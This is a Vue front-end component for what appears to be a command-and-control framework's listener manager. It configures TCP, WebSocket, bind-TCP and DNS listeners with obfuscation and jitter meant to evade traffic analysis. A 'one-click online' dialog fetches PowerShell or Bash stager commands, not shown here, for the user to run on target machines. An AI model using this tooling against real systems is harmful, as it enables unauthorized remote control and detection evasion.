<template>
  <div class="listener-manager">
    <el-card shadow="never">
      <template #header>
        <div class="card-header">
          <span>
            <el-icon style="vertical-align: middle; margin-right: 8px;"><Monitor /></el-icon>
            监听管理
          </span>
          <el-button type="primary" :icon="Plus" @click="openCreateDialog">新增监听器</el-button>
        </div>
      </template>

      <el-table :data="listeners" style="width: 100%" v-loading="loading">
        <el-table-column prop="id" label="ID" width="100" />
        <el-table-column prop="protocol" label="核心协议" width="130">
          <template #default="scope">
            <el-tag :type="getProtocolType(scope.row.protocol)" effect="dark">
              {{ scope.row.protocol }}
            </el-tag>
          </template>
        </el-table-column>
        <el-table-column label="监听地址" width="200">
          <template #default="scope">
            <code class="addr-code">{{ scope.row.bind_ip || '0.0.0.0' }}:{{ scope.row.port }}</code>
          </template>
        </el-table-column>
        <el-table-column prop="note" label="备注" min-width="150" show-overflow-tooltip>
          <template #default="scope">
            <span v-if="scope.row.note">{{ scope.row.note }}</span>
            <span v-else style="color: #666; font-style: italic;">No Remark</span>
          </template>
        </el-table-column>
        <el-table-column prop="status" label="状态" width="120">
          <template #default="scope">
            <el-badge is-dot :type="scope.row.status === 'Running' ? 'success' : 'danger'">
              <span :style="{ color: scope.row.status === 'Running' ? '#00f2ea' : '#ff4d4f' }">
                {{ scope.row.status }}
              </span>
            </el-badge>
          </template>
        </el-table-column>
        <el-table-column label="操作" width="280" align="center">
          <template #default="scope">
            <el-button 
              type="primary"
              link
              style="font-weight: 600; font-size: 13px;"
              @click="openStagerDialog(scope.row)"
            >
              一键上线
            </el-button>
            <el-button 
              v-if="scope.row.status === 'Stopped' || scope.row.status === 'Failed'"
              link
              style="color: #67c23a; font-weight: 600; font-size: 13px;"
              @click="handleStart(scope.row.id)"
            >
              启动
            </el-button>
            <el-button 
              v-else-if="scope.row.status === 'Running'"
              link
              style="color: #e6a23c; font-weight: 600; font-size: 13px;"
              @click="handleStop(scope.row.id)"
            >
              停止
            </el-button>
            <el-button 
              link
              style="color: #f56c6c; font-weight: 600; font-size: 13px; margin-left: 12px;"
              @click="handleDelete(scope.row.id)"
            >
              删除
            </el-button>
          </template>
        </el-table-column>
      </el-table>
    </el-card>

    <el-dialog v-model="stagerVisible" title="一键上线" width="600px">
      <div style="margin-bottom: 20px;">
        <el-radio-group v-model="stagerPlatform" size="small" @change="fetchStager">
          <el-radio-button label="windows">Windows (PowerShell)</el-radio-button>
          <el-radio-button label="linux">Linux (Bash)</el-radio-button>
        </el-radio-group>
      </div>
      <div v-loading="stagerLoading">
        <p style="font-size: 13px; color: #888; margin-bottom: 10px;">在目标机器执行以下命令即可上线：</p>
        <div class="command-box">
          <code>{{ stagerCommand }}</code>
          <el-button :icon="CopyDocument" circle size="small" class="copy-btn" @click="copyCommand" />
        </div>
      </div>
    </el-dialog>


    <!-- Professional Listener Configuration Modal -->
    <el-dialog 
      v-model="dialogVisible" 
      title="配置新监听器" 
      width="650px" 
      destroy-on-close
      class="professional-dialog"
    >
      <el-form :model="form" label-width="130px" label-position="left">
        <!-- Step 1: Protocol Selection -->
        <div class="form-section-title">通讯协议</div>
        <div style="margin-bottom: 25px; display: flex; justify-content: center;">
          <el-radio-group v-model="form.protocol" size="large" @change="handleProtocolChange">
            <el-radio-button label="TCP">TCP</el-radio-button>
            <el-radio-button label="WebSocket">WS</el-radio-button>
            <el-radio-button label="正向TCP">正向TCP</el-radio-button>
            <el-radio-button label="DNS">DNS</el-radio-button>
          </el-radio-group>
        </div>

        <!-- Step 2: Global Configuration -->
        <el-divider content-position="left"><el-icon><Setting /></el-icon> 基础设置</el-divider>
        <el-form-item :label="form.protocol === '正向TCP' ? '监听端口' : '监听地址'" required>
          <el-input v-model="listenAddr" :placeholder="form.protocol === '正向TCP' ? '4444' : '0.0.0.0:8080'" />
          <div class="tip" v-if="form.protocol === '正向TCP'">请直接输入受控端需要监听的端口（例如：4444）。</div>
          <div class="tip" v-else>格式 IP:Port (例如 :80 或 0.0.0.0:443)</div>
        </el-form-item>
        <el-form-item label="备注/别名">
          <el-input v-model="form.note" placeholder="选填，给监听器起个名字" />
        </el-form-item>
        <el-form-item label="Public Host" v-if="form.protocol !== '正向TCP'">
          <el-input v-model="form.public_host" placeholder="例如：c2.example.com" />
          <div class="tip">Agent 迁移或重连时优先使用该地址。</div>
        </el-form-item>

        <!-- Step 3: Protocol Specific Configuration (Dynamic) -->
        <template v-if="form.protocol === 'DNS'">
          <el-divider content-position="left"><el-icon><Promotion /></el-icon> DNS 专有配置</el-divider>
          <el-form-item label="NS Domain" required>
            <el-input v-model="form.ns_domain" placeholder="ns1.example.com" />
            <div class="tip">The domain delegated to this server (NS record target)</div>
          </el-form-item>
          <el-form-item label="Public DNS">
            <el-input v-model="form.public_dns" placeholder="8.8.8.8:53" />
            <div class="tip">Used for local testing or fallback</div>
          </el-form-item>
        </template>

        <!-- Step 4: Heartbeat & Reliability -->
        <el-divider content-position="left"><el-icon><Connection /></el-icon> 心跳与通信策略</el-divider>
        <el-form-item label="心跳模式">
          <el-radio-group v-model="form.heartbeat_mode" size="small">
            <el-radio label="auto">随机抖动 (推荐)</el-radio>
            <el-radio label="custom">自定义设置</el-radio>
          </el-radio-group>
          <div class="tip" v-if="form.heartbeat_mode === 'auto'">系统自动模拟人类交互行为，随机产生 25%-50% 的时间抖动，极强抗流量分析。</div>
        </el-form-item>

        <el-row :gutter="20" v-if="form.heartbeat_mode === 'custom'">
          <el-col :span="12">
            <el-form-item label="心跳间隔">
              <el-input-number v-model="form.heartbeat_interval" :min="1" style="width: 100%" />
            </el-form-item>
          </el-col>
          <el-col :span="12">
            <el-form-item label="最大重试次">
              <el-input-number v-model="form.max_retry" :min="1" style="width: 100%" />
            </el-form-item>
          </el-col>
        </el-row>

        <!-- Step 5: Security & Encryption -->
        <el-divider content-position="left"><el-icon><Lock /></el-icon> 安全与加密</el-divider>
        <el-form-item label="加密模式">
          <el-select v-model="form.encrypt_mode" style="width: 100%" disabled>
            <el-option label="AES-256-GCM (Enforced)" value="AES-256-GCM" />
          </el-select>
        </el-form-item>
        
        <el-form-item label="Vkey (Key)">
          <div style="flex: 1; display: flex; gap: 8px;">
            <el-input v-model="form.encrypt_key" :type="showKey ? 'text' : 'password'">
              <template #suffix>
                <el-icon class="cursor-pointer" @click="showKey = !showKey">
                  <View v-if="showKey" />
                  <Hide v-else />
                </el-icon>
              </template>
            </el-input>
            <el-button @click="generateKey">随机</el-button>
          </div>
        </el-form-item>

        <el-form-item label="Encryption Salt">
          <div style="flex: 1; display: flex; gap: 8px;">
            <el-input v-model="form.encryption_salt" placeholder="6-char random salt" />
            <el-button @click="generateRandomSalt">随机</el-button>
          </div>
        </el-form-item>

        <el-form-item label="报文混淆">
          <el-select v-model="form.obfuscate_mode" style="width: 100%">
            <el-option label="None" value="None" />
            <el-option label="Base64 Encoding" value="Base64" />
            <el-option label="XOR Stream" value="XOR" />
            <el-option label="Junk Data Padding" value="Junk" />
          </el-select>
        </el-form-item>
      </el-form>

      <template #footer>
        <div style="display: flex; justify-content: space-between; align-items: center;">
          <div style="color: #999; font-size: 12px;">* 确保防火墙已放行对应端口及协议</div>
          <div>
            <el-button @click="dialogVisible = false">取消</el-button>
            <el-button type="primary" :loading="submitting" @click="createListener">启动监听器</el-button>
          </div>
        </div>
      </template>
    </el-dialog>
  </div>
</template>

<script setup>
import { ref, reactive, onMounted } from 'vue'
import api from '../api/index'
import { ElMessage, ElMessageBox } from 'element-plus'
import { Plus, Connection, Monitor, Lock, Setting, Promotion, View, Hide, Refresh, CopyDocument } from '@element-plus/icons-vue'

const listeners = ref([])
const loading = ref(false)
const dialogVisible = ref(false)
const submitting = ref(false)
const showKey = ref(false)
const listenAddr = ref('0.0.0.0:8081')

// Stager State
const stagerVisible = ref(false)
const stagerLoading = ref(false)
const stagerCommand = ref('')
const stagerPlatform = ref('windows')
const currentListener = ref(null)

const form = reactive({
  bind_ip: '0.0.0.0',
  port: 8081,
  note: '',
  protocol: 'WebSocket',
  public_host: '',
  encrypt_mode: 'AES-256-GCM',
  encrypt_key: '',
  encryption_salt: '',
  obfuscate_mode: 'None',
  // DNS Specific
  ns_domain: '',
  public_dns: '8.8.8.8:53',
  // Advanced
  heartbeat_mode: 'auto',
  heartbeat_interval: 10,
  max_retry: 30
})


const fetchListeners = async () => {
  loading.value = true
  try {
    const res = await api.get('/api/listeners')
    listeners.value = res.data
  } catch (e) {
    ElMessage.error('无法同步监听器列表')
  } finally {
    loading.value = false
  }
}

const openCreateDialog = () => {
  dialogVisible.value = true
  generateKey() // Auto-generate key for security
  generateRandomSalt() // Auto-generate salt
  handleProtocolChange(form.protocol)
}

const handleProtocolChange = (val) => {
  if (val === 'DNS') {
    listenAddr.value = '0.0.0.0:53'
  } else if (val === 'WebSocket') {
    listenAddr.value = '0.0.0.0:8081'
  } else if (val === 'TCP') {
    listenAddr.value = '0.0.0.0:8888'
  } else if (val === '正向TCP') {
    listenAddr.value = '4444'
  }
}

const generateKey = () => {
  const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789'
  let key = ''
  for (let i = 0; i < 32; i++) {
    key += chars.charAt(Math.floor(Math.random() * chars.length))
  }
  form.encrypt_key = key
  showKey.value = true
}

const generateRandomSalt = () => {
  const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'
  let result = ''
  for (let i = 0; i < 6; i++) {
    result += chars.charAt(Math.floor(Math.random() * chars.length))
  }
  form.encryption_salt = result
}

const getProtocolType = (protocol) => {
  const typeMap = {
    'WebSocket': 'success',
    'TCP': 'primary',
    '正向TCP': 'warning',
    'DNS': 'warning'
  }
  return typeMap[protocol] || 'info'
}

const createListener = async () => {
  const addrParts = listenAddr.value.split(':')
  if (addrParts.length === 2) {
    form.bind_ip = addrParts[0] || '0.0.0.0'
    form.port = parseInt(addrParts[1])
  } else if (!isNaN(listenAddr.value)) {
    form.bind_ip = '0.0.0.0'
    form.port = parseInt(listenAddr.value)
  }

  if (form.protocol === 'DNS' && !form.ns_domain) {
    ElMessage.warning('DNS 协议必须配置 NS Domain')
    return
  }
  if (!form.encrypt_key) {
    ElMessage.warning('必须设置通讯密钥')
    generateKey()
    return
  }

  submitting.value = true
  try {
    await api.post('/api/listeners', { ...form })
    ElMessage.success(`监听器 [${form.protocol}] 已启动`)
    dialogVisible.value = false
    fetchListeners()
  } catch (e) {
    ElMessage.error('启动失败')
  } finally {
    submitting.value = false
  }
}

const handleStop = async (id) => {
  try {
    await api.post(`/api/listeners/${id}/stop`)
    ElMessage.success('监听器已停止')
    fetchListeners()
  } catch (e) {
    ElMessage.error('停止失败')
  }
}

const handleStart = async (id) => {
  try {
    await api.post(`/api/listeners/${id}/start`)
    ElMessage.success('监听器已重新启动')
    fetchListeners()
  } catch (e) {
    ElMessage.error('启动失败')
  }
}

const handleDelete = (id) => {
  ElMessageBox.confirm('确定要删除该监听器吗？', '警告', {
    confirmButtonText: '确定',
    cancelButtonText: '取消',
    type: 'warning'
  }).then(async () => {
    try {
      await api.delete(`/api/listeners/${id}`)
      ElMessage.success('监听器已删除')
      fetchListeners()
    } catch (e) {
      ElMessage.error('删除失败')
    }
  })
}

const openStagerDialog = (row) => {
  currentListener.value = row
  stagerVisible.value = true
  fetchStager()
}

const fetchStager = async () => {
  if (!currentListener.value) return
  stagerLoading.value = true
  try {
    const res = await api.get('/api/stager', {
      params: {
        listener_id: currentListener.value.id,
        os: stagerPlatform.value,
        arch: 'x64',
        host: currentListener.value.public_host || window.location.hostname
      }
    })
    stagerCommand.value = res.data.command
  } catch (e) {
    ElMessage.error('无法生成上线命令')
  } finally {
    stagerLoading.value = false
  }
}

const copyCommand = () => {
  navigator.clipboard.writeText(stagerCommand.value)
  ElMessage.success('命令已复制到剪贴板')
}

onMounted(fetchListeners)
</script>

<style scoped>
.card-header {
  display: flex;
  justify-content: space-between;
  align-items: center;
}
.addr-code {
  background: rgba(64, 158, 255, 0.1);
  padding: 2px 6px;
  border-radius: 4px;
  color: var(--primary-color);
  font-family: 'JetBrains Mono', monospace;
  border: 1px solid rgba(64, 158, 255, 0.2);
}
.tip {
  font-size: 12px;
  color: #888;
  margin-top: 4px;
  line-height: 1.2;
}
.form-section-title {
  font-size: 14px;
  font-weight: bold;
  color: var(--primary-color);
  margin-bottom: 15px;
  text-align: center;
}
.cursor-pointer {
  cursor: pointer;
}
:deep(.el-divider__text) {
  background-color: var(--card-bg) !important;
  color: var(--primary-color);
  font-size: 13px;
}
.professional-dialog :deep(.el-dialog__body) {
  padding-top: 10px;
}
.command-box {
  background: #1a1a1a;
  padding: 15px;
  border-radius: 8px;
  position: relative;
  border: 1px solid #333;
}
.command-box code {
  color: #00f2ea;
  font-family: 'JetBrains Mono', monospace;
  font-size: 13px;
  word-break: break-all;
  white-space: pre-wrap;
  display: block;
  padding-right: 30px;
}
.copy-btn {
  position: absolute;
  top: 10px;
  right: 10px;
  background: #333 !important;
  border: none !important;
  color: #888 !important;
}
.copy-btn:hover {
  color: #00f2ea !important;
}
</style>
